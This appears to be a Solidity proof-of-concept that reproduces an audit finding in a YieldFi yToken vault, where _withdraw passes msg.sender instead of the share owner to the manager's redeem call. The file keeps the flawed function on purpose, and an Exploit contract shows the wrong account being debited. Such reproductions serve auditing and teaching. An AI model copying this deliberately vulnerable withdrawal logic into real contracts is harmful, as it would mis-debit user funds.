// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Synthetic (browser-EVM, cheatcode-free) reduction of AuditVault #55538 —
// YieldFi YToken passes the wrong `owner` (msg.sender) to Manager.redeem in the
// delegated-withdrawal path. The vulnerable `_withdraw` body is reproduced
// VERBATIM from the Cyfrin report; the ERC20/ERC4626 accounting around it is a
// compact reduction (the registry PoC uses the real OpenZeppelin ERC4626 base).

interface IManager {
    function redeem(
        address owner,
        address yToken,
        address asset,
        uint256 amount,
        address receiver,
        address affiliate,
        bytes calldata data
    ) external;
}

/// Minimal ERC4626-style share token with the real vulnerable _withdraw.
contract YToken {
    string public name = "YieldFi yToken";
    string public symbol = "yUSD";
    mapping(address => uint256) public balanceOf; // shares
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    address public assetToken;
    address public manager;

    constructor(address _asset, address _manager) {
        assetToken = _asset;
        manager = _manager;
    }

    function asset() public view returns (address) { return assetToken; }

    // setup helper (like a first-deposit); mints shares 1:1
    function mintShares(address to, uint256 shares) external {
        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 a = allowance[owner][spender];
        if (a != type(uint256).max) {
            require(a >= amount, "ERC20: insufficient allowance");
            allowance[owner][spender] = a - amount;
        }
    }

    function _burn(address account, uint256 shares) internal {
        require(balanceOf[account] >= shares, "!balance");
        balanceOf[account] -= shares;
        totalSupply -= shares;
    }

    /// The Manager (redeemer) burns the redeemer's shares during order execution.
    function managerBurn(address account, uint256 shares) external {
        require(msg.sender == manager, "!minter");
        _burn(account, shares);
    }

    /// ERC4626-style redeem entrypoint: caller redeems `owner`'s shares.
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(shares <= balanceOf[owner], "redeem more than max");
        assets = shares; // 1:1 in this reduction
        _withdraw(msg.sender, receiver, owner, assets, shares);
    }

    // ---- VERBATIM from the Cyfrin report (YToken.sol#L161-L172) ----
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal {
        require(receiver != address(0) && owner != address(0) && assets > 0 && shares > 0, "!valid");
        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }
        // Instead of burning shares here, just redirect to Manager
        // @audit-issue `msg.sender` passed as owner (should be `owner`)
        IManager(manager).redeem(msg.sender, address(this), asset(), shares, receiver, address(0), "");
    }
}

interface IYTokenBurn {
    function managerBurn(address account, uint256 shares) external;
}

/// Minimal faithful Manager: records the order and burns the given owner's shares.
contract Manager is IManager {
    event OrderRequest(
        address indexed owner, address indexed yToken, address indexed asset, address receiver, uint256 amount, bool isDeposit
    );

    function redeem(address owner, address yToken, address asset, uint256 amount, address receiver, address, bytes calldata)
        external
    {
        emit OrderRequest(owner, yToken, asset, receiver, amount, false);
        IYTokenBurn(yToken).managerBurn(owner, amount); // burns `owner` == the wrong (caller) account
    }
}

/// A stand-in EOA so victim / u1 are distinct accounts without cheatcodes.
contract Actor {
    function exec(address target, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "actor call failed");
        return ret;
    }
}

contract Exploit {
    YToken public ytoken;
    Manager public manager;
    Actor public victim;
    Actor public u1;
    address public receiver = address(0xBEEF);

    uint256 public constant VICTIM_SHARES = 100 ether;
    uint256 public constant U1_SHARES = 50 ether;
    uint256 public constant REDEEM = 50 ether;

    uint256 public victimSharesAfter;
    uint256 public u1SharesAfter;

    constructor() {
        manager = new Manager();
        ytoken = new YToken(address(0xA55E7), address(manager));
        victim = new Actor();
        u1 = new Actor();
        ytoken.mintShares(address(victim), VICTIM_SHARES);
        ytoken.mintShares(address(u1), U1_SHARES);
    }

    function run() external payable {
        // victim authorises u1 to redeem 50 of victim's shares
        victim.exec(address(ytoken), abi.encodeWithSelector(YToken.approve.selector, address(u1), REDEEM));

        // u1 redeems 50 shares ON BEHALF OF victim
        u1.exec(
            address(ytoken),
            abi.encodeWithSelector(YToken.redeem.selector, REDEEM, receiver, address(victim))
        );

        victimSharesAfter = ytoken.balanceOf(address(victim));
        u1SharesAfter = ytoken.balanceOf(address(u1));

        // HARM: u1's OWN shares were burned; victim's are untouched even though
        // victim's allowance was consumed. The wrong account was debited.
        require(u1SharesAfter == U1_SHARES - REDEEM, "expected u1 shares wrongly burned to 0");
        require(victimSharesAfter == VICTIM_SHARES, "expected victim shares untouched (wrong-owner bug)");
        require(ytoken.allowance(address(victim), address(u1)) == 0, "victim allowance spent for nothing");
    }
}
